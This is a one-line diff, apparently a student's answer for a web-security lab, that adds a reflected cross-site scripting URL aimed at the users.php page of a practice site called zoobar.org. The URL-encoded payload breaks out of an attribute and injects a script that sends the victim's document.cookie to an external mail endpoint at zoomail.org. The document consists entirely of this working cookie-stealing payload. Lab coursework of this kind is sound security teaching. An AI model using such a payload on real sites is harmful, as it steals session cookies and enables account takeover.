@@ -1,0 +1,1 @@
+zoobar.org/users.php?user=\"\>\<script\>new Image().src%3D'http://zoomail.org/sendmail.php?%26netid=ylyu76%26payload='%2B%0Adocument.cookie%2B%0A'%26random='%2B%0AMath.random();</script\>
